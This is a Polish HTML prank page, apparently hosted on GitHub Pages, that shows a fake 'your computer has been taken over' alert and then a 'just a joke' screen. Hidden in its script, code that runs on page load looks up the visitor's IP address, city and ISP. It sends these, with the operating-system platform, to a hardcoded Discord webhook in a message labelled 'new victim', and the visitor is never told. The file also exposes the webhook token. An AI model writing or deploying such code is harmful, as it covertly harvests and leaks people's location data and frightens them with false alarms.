<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM ALERT - Krytyczny błąd bezpieczeństwa</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #000;
            color: #00ff41;
            font-family: 'Share Tech Mono', monospace;
            overflow-x: hidden;
            cursor: none;
        }

        .cursor {
            width: 20px; height: 20px;
            border: 2px solid #00ff41;
            border-radius: 50%;
            position: fixed;
            pointer-events: none;
            z-index: 9999;
            box-shadow: 0 0 10px #00ff41;
        }

        #matrix {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0.1;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 10;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .alert-box {
            border: 2px solid #ff0000;
            background: rgba(0,0,0,0.95);
            max-width: 750px;
            width: 100%;
            box-shadow: 0 0 50px rgba(255,0,0,0.5), inset 0 0 40px rgba(255,0,0,0.05);
            animation: borderPulse 1.2s infinite;
        }

        @keyframes borderPulse {
            0%, 100% { box-shadow: 0 0 40px rgba(255,0,0,0.5); }
            50% { box-shadow: 0 0 80px rgba(255,0,0,0.8); }
        }

        .alert-header {
            background: #ff0000;
            padding: 15px;
            color: #000;
            font-family: 'Orbitron';
            font-weight: 900;
            text-align: center;
            letter-spacing: 2px;
        }

        .alert-body { padding: 30px; }

        .skull {
            text-align: center;
            font-size: 65px;
            margin-bottom: 15px;
            animation: shake 0.4s infinite;
            filter: drop-shadow(0 0 15px red);
        }

        @keyframes shake {
            0%,100%{transform:translateX(0)}
            25%{transform:translateX(-4px)}
            75%{transform:translateX(4px)}
        }

        h1 {
            font-family: 'Orbitron';
            font-size: 24px;
            color: #ff0000;
            text-align: center;
            letter-spacing: 3px;
            margin-bottom: 20px;
            text-shadow: 0 0 20px red;
        }

        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 25px;
        }

        .info-card {
            background: rgba(255,0,0,0.05);
            border: 1px solid #ff000044;
            padding: 15px;
        }

        .label { color: #ff6666; font-size: 10px; text-transform: uppercase; margin-bottom: 5px; }
        .value { color: #00ff41; font-size: 14px; }

        .progress-bar {
            height: 10px;
            background: #1a0000;
            border: 1px solid #ff000044;
            margin-bottom: 15px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6600);
            width: 0%;
            box-shadow: 0 0 15px red;
        }

        .typing-text {
            font-size: 12px;
            color: #00cc33;
            height: 30px;
            margin-bottom: 20px;
        }

        .btn-panic {
            width: 100%;
            padding: 20px;
            background: #ff0000;
            border: none;
            color: #000;
            font-family: 'Orbitron';
            font-weight: 900;
            font-size: 15px;
            letter-spacing: 5px;
            cursor: pointer;
        }

        #reveal-screen {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: #000;
            z-index: 1000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
    </style>
</head>
<body>

<div class="cursor" id="cursor"></div>
<canvas id="matrix"></canvas>

<div class="container">
    <div class="alert-box">
        <div class="alert-header">⚠ KRYTYCZNY ALERT BEZPIECZEŃSTWA ⚠</div>
        <div class="alert-body">
            <div class="skull">💀</div>
            <h1>TWÓJ KOMPUTER ZOSTAŁ PRZEJĘTY</h1>
            
            <div class="info-grid">
                <div class="info-card">
                    <div class="label">Public IP</div>
                    <div class="value" id="ip-display">Pobieranie...</div>
                </div>
                <div class="info-card">
                    <div class="label">Lokalizacja</div>
                    <div class="value" id="loc-display">Lokalizowanie...</div>
                </div>
                <div class="info-card">
                    <div class="label">System</div>
                    <div class="value" id="os-display">Wykrywanie...</div>
                </div>
                <div class="info-card">
                    <div class="label">Status</div>
                    <div class="value" style="color:red;">ZAINFEKOWANY</div>
                </div>
            </div>

            <div class="progress-bar"><div class="progress-fill" id="p-bar"></div></div>
            <div class="typing-text" id="typing-box">> Inicjalizacja ataku...</div>

            <button class="btn-panic" onclick="showReveal()">🚨 ZATRZYMAJ ATAK 🚨</button>
        </div>
    </div>
</div>

<div id="reveal-screen">
    <h1 style="color: #00ff41; font-size: 50px;">HAHA ŻART! 😂</h1>
    <div style="font-size: 100px; margin-top: 30px;">✅</div>
</div>

<script>
    // Cursor
    const cursor = document.getElementById('cursor');
    document.addEventListener('mousemove', e => {
        cursor.style.left = e.clientX - 10 + 'px';
        cursor.style.top = e.clientY - 10 + 'px';
    });

    // Matrix Rain
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const drops = Array(Math.floor(canvas.width / 20)).fill(1);
    function draw() {
        ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = '#00ff41'; ctx.font = '15px monospace';
        drops.forEach((y, i) => {
            ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
            if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 50);

    // SYSTEM INFO
    document.getElementById('os-display').textContent = navigator.platform;

    // --- LOGIKA IP I DISCORDA (HTTPS READY) ---
    const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1479604054144323776/jTaf2b7izpoRE2wzqnlx3imiYGKPI5mtK1XFiPYzvR01RrOwqGsvrexuA00w6zigWDLL';

    async function catchData() {
        try {
            // Zmieniamy na ipapi.co (obsługuje HTTPS za darmo)
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            
            const ip = data.ip || "Nie wykryto";
            const city = data.city || "Nieznane";
            const isp = data.org || "Nieznany";

            document.getElementById('ip-display').textContent = ip;
            document.getElementById('loc-display').textContent = city;

            // Wyślij na Discord
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🎯 NOWA OFIARA (GITHUB PAGES)",
                        color: 16711680,
                        fields: [
                            {name: "🌐 IP", value: ip, inline: true},
                            {name: "📍 Miasto", value: city, inline: true},
                            {name: "📡 ISP", value: isp, inline: false},
                            {name: "💻 System", value: navigator.platform, inline: true}
                        ]
                    }]
                })
            });
        } catch(e) {
            document.getElementById('ip-display').textContent = "Blokada AdBlocka";
            document.getElementById('loc-display').textContent = "Zablokowano";
        }
    }
    catchData();

    // Progress bar
    let p = 0;
    setInterval(() => {
        if(p < 100) {
            p += 0.3;
            document.getElementById('p-bar').style.width = p + '%';
        }
    }, 100);

    function showReveal() {
        document.getElementById('reveal-screen').style.display = 'flex';
    }
</script>
</body>
</html>
